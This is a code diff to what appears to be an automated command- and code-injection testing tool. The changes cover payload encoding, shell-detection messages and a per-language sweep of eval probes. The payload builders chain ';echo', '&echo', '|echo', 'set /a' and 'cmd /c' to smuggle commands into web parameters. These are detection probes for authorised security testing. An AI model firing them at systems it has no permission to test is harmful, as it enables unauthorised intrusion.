@@ -49,7 +49,7 @@ Generate fresh operands and markers per call; match the markers around the compu
 def basic_payload_generator():
   rand_a = random.randint(1, 10000)
   rand_b = random.randint(1, 10000)
-  calc_string = str(rand_a) + "%2B" + str(rand_b)
+  calc_string = str(rand_a) + "+" + str(rand_b)
   marker1 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
   marker2 = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
 
@@ -58,7 +58,7 @@ def basic_payload_generator():
     # 'expr' wants its operands as separate arguments - given one, it echoes the string back
     # instead of adding anything up.
     prefix = "expr "
-    calc_string = str(rand_a) + settings.SINGLE_WHITESPACE + "%2B" + settings.SINGLE_WHITESPACE + str(rand_b)
+    calc_string = str(rand_a) + settings.SINGLE_WHITESPACE + "+" + settings.SINGLE_WHITESPACE + str(rand_b)
   else:
     prefix = "("
     suffix = ")"
@@ -66,16 +66,16 @@ def basic_payload_generator():
   alter_interpreter_basic_string = " -c \"print(int(" + calc_string + "))\""
 
   settings.BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
-                                              "%26echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2 +
                                               "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.BASIC_STRING + settings.CMD_SUB_SUFFIX + marker2,
-                                              "|echo " + marker1 + "%26set /a " + settings.BASIC_STRING + "%26echo " + marker2 +
-                                              "%26echo " + marker1 + "%26set /a " + settings.BASIC_STRING + "%26echo " + marker2
+                                              "|echo " + marker1 + "&set /a " + settings.BASIC_STRING + "&echo " + marker2 +
+                                              "&echo " + marker1 + "&set /a " + settings.BASIC_STRING + "&echo " + marker2
                                               ]
   settings.ALTER_INTERPRETER_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
-                                              "%26echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
+                                              "&echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2 +
                                               "|echo " + marker1 + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + alter_interpreter_basic_string + settings.CMD_SUB_SUFFIX + marker2,
-                                              "|echo " + marker1 + "%26for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2 +
-                                              "%26echo " + marker1 + "%26for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "%26echo " + marker2
+                                              "|echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2 +
+                                              "&echo " + marker1 + "&for /f \"tokens=* eol=\" %i in ('cmd /c " + settings.WIN_PYTHON_INTERPRETER + alter_interpreter_basic_string + "') do @set /p=%i" + settings.CMD_NUL + "&echo " + marker2
                                               ]
   settings.BASIC_COMMAND_INJECTION_RESULT = re.escape(marker1) + r"\s*" + re.escape(str(rand_a + rand_b)) + r"\s*" + re.escape(marker2)
 
@@ -135,20 +135,22 @@ def heuristic_request(url, http_request_method, check_parameter, payload, whites
   if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
     payload = checks.payload_fixation(payload)
     # Percent-encode cookie values to safely handle delimiters and special characters.
-    encoded_payload = _urllib.parse.quote(payload, safe=settings.query_safe_chars())
+    encoded_payload = checks.encode_payload(payload)
     cookie = checks.process_injectable_value(encoded_payload, menu.options.cookie).encode(settings.DEFAULT_CODEC)
   else:
     cookie = checks.remove_tags(menu.options.cookie).encode(settings.DEFAULT_CODEC)
 
   if not settings.IGNORE_USER_DEFINED_POST_DATA and menu.options.data and settings.INJECT_TAG in menu.options.data:
-    data = checks.restore_xml_layout(checks.process_injectable_value(payload, menu.options.data)).encode(settings.DEFAULT_CODEC)
+    # A structured body escapes for itself; a form-encoded one needs the payload encoded for it.
+    body_payload = payload if (settings.IS_JSON or settings.IS_XML) else checks.encode_payload(payload)
+    data = checks.restore_xml_layout(checks.process_injectable_value(body_payload, menu.options.data)).encode(settings.DEFAULT_CODEC)
   else:
     if settings.USER_DEFINED_POST_DATA:
       settings.USER_DEFINED_POST_DATA = checks.remove_tags(settings.USER_DEFINED_POST_DATA)
       data = settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC)
   if settings.INJECT_TAG in url:
     # Encode query string, preserving delimiters and configured parameter delimiter
-    encoded_payload = _urllib.parse.quote(payload, safe=settings.query_safe_chars())
+    encoded_payload = checks.encode_payload(payload)
     tmp_url = checks.process_injectable_value(encoded_payload, url)
   else:
     tmp_url = checks.remove_tags(tmp_url)
@@ -207,9 +209,9 @@ def command_injection_heuristic_basic(url, http_request_method, check_parameter,
             match = re.search(settings.BASIC_COMMAND_INJECTION_RESULT, html_data)
             if match:
               settings.IDENTIFIED_COMMAND_INJECTION = True
-              possible_os = ('Unix-like shell', 'Windows')[_ != 1]
-              checks.set_target_os(possible_os)
-              announce_heuristic_finding("possible operating system: '" + possible_os + "'")
+              # The token the rest of the code compares against, and then what was really shown.
+              checks.set_target_os(('Unix-like', 'Windows')[_ != 1])
+              announce_heuristic_finding("identified command shell: '" + checks.target_shell_label() + "'")
               # A shell answering here says nothing about whether a string is also evaluated as
               # code, so it settles the question only where the code injection sink was not asked
               # for by name - otherwise every technique carrying it would skip itself, and the run
@@ -306,7 +308,7 @@ def oob_heuristic_basic(url, http_request_method, check_parameter, place):
     return url
   if not menu.options.os:
     settings.TARGET_OS = target_os
-  announce_heuristic_finding("possible operating system: '" + ("Windows" if settings.TARGET_OS == settings.OS.WINDOWS else "Unix-like shell") + "'")
+  announce_heuristic_finding("identified command shell: '" + checks.target_shell_label() + "'")
   return url
 
 """
@@ -314,40 +316,71 @@ Heuristic (basic) test for code injection warnings
 """
 def code_injections_heuristic_basic(url, http_request_method, check_parameter, place):
   check_parameter = check_parameter.lstrip().rstrip()
-  # What the probe answered with, where it answered at all. A complaint from the interpreter says
-  # the string was evaluated without saying by which version, so the language is all there is.
-  detail = "possible evaluated language: '" + settings.EVAL_GRAMMAR.LABEL + "'"
+  # What the probe answered with. A complaint from the interpreter names the language without
+  # naming a version, so the language is all there is to report in that case.
+  detail = "identified evaluated language: '" + settings.EVAL_GRAMMAR.LABEL + "'"
   settings.EVAL_BASED_STATE = True
   try:
     whitespace = settings.SINGLE_WHITESPACE
     if (not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_EVAL_PROBE):
-      for payload in settings.EVAL_PROBE_PAYLOADS:
-        response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place)
-        if type(response) is not bool and response is not None:
-          html_data = checks.process_page_content(response, action="decode")
-          match = re.search(settings.EVAL_PROBE_REGEX, html_data)
-          if match:
-            detail = "possible " + settings.EVAL_GRAMMAR.LABEL + " version: '" + match.group(1) + "'"
-            settings.IDENTIFIED_EVAL_PROBE = True
-          else:
+      """
+      A complaint is worth less than a version, so one does not end the search.
+
+      Which boundary reaches the sink is what the sweep is for, and the ones that miss tend to make
+      the interpreter complain - so stopping at the first complaint reports the language and never
+      learns the version a later boundary would have answered with. A version ends it; a complaint
+      is remembered and the rest are tried.
+      """
+      """
+      Where no language was named, each supported one is probed with its own payloads.
+
+      Nothing about the target says which language is evaluating the string, and a probe written for
+      one of them means nothing to another - so asking only the default answered for that language
+      and reported the parameter as not injectable for every other.
+
+      Whichever language answers is left in force, so the techniques that follow speak the one the
+      heuristic found rather than starting the search over.
+      """
+      if menu.options.eval_sink == settings.EVAL_ALL_LANGUAGES:
+        languages = settings.SUPPORTED_EVAL_LANGUAGES
+      else:
+        languages = (settings.EVAL_GRAMMAR.NAME,)
+      for language in languages:
+        settings.set_eval_grammar(language)
+        if len(languages) > 1 and settings.VERBOSITY_LEVEL != 0:
+          debug_msg = "Testing the '" + settings.EVAL_GRAMMAR.LABEL + "' language."
+          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+        for payload in settings.EVAL_PROBE_PAYLOADS:
+          response, url = heuristic_request(url, http_request_method, check_parameter, payload, whitespace, place)
+          if type(response) is not bool and response is not None:
+            html_data = checks.process_page_content(response, action="decode")
+            match = re.search(settings.EVAL_PROBE_REGEX, html_data)
+            if match:
+              detail = "identified " + settings.EVAL_GRAMMAR.LABEL + " version: '" + match.group(1) + "'"
+              settings.IDENTIFIED_EVAL_PROBE = True
+              break
             for warning in settings.EVAL_WARNINGS:
               if warning in html_data:
                 settings.IDENTIFIED_WARNINGS = True
+                detail = "identified evaluated language: '" + settings.EVAL_GRAMMAR.LABEL + "'"
                 break
-          if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_EVAL_PROBE:
-            announce_heuristic_finding(detail)
-            # Code injection is tested only where it was asked for, so what the heuristic saw is
-            # named, the switch that would act on it is named too, and the run carries on testing
-            # for command injection either way.
-            if menu.options.eval_sink:
-              settings.SKIP_COMMAND_INJECTIONS = True
-            elif not settings.EVAL_SUGGESTED:
-              settings.EVAL_SUGGESTED = True
-              message = "Do you want to test it for code injection (i.e. switch '--eval')? [Y/n] "
-              if common.read_input(message, default="Y", check_batch=True) in settings.CHOICE_YES:
-                menu.options.eval_sink = settings.EVAL_ALL_LANGUAGES
-                settings.SKIP_COMMAND_INJECTIONS = True
-            break
+        if settings.IDENTIFIED_EVAL_PROBE:
+          break
+
+      # Said once, whichever of the two the sweep came back with.
+      if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_EVAL_PROBE:
+        announce_heuristic_finding(detail)
+        # Code injection is tested only where it was asked for, so what the heuristic saw is
+        # named, the switch that would act on it is named too, and the run carries on testing
+        # for command injection either way.
+        if menu.options.eval_sink:
+          settings.SKIP_COMMAND_INJECTIONS = True
+        elif not settings.EVAL_SUGGESTED:
+          settings.EVAL_SUGGESTED = True
+          message = "Do you want to test it for code injection (i.e. switch '--eval')? [Y/n] "
+          if common.read_input(message, default="Y", check_batch=True) in settings.CHOICE_YES:
+            menu.options.eval_sink = settings.EVAL_ALL_LANGUAGES
+            settings.SKIP_COMMAND_INJECTIONS = True
 
     settings.EVAL_BASED_STATE = False
     return url
@@ -369,6 +402,14 @@ speaks the same one the detection did.
 """
 def _run_over_languages(exploit):
   if menu.options.eval_sink != settings.EVAL_ALL_LANGUAGES:
+    return exploit() != False
+  """
+  A language the heuristic already recognised is the only one tried.
+
+  Its probe came back with that language's own version, which is as much as a sweep here could
+  establish - and every language tried and rejected costs a full delay on the time-based technique.
+  """
+  if settings.IDENTIFIED_EVAL_PROBE:
     return exploit() != False
   languages = settings.SUPPORTED_EVAL_LANGUAGES
   for language in languages:
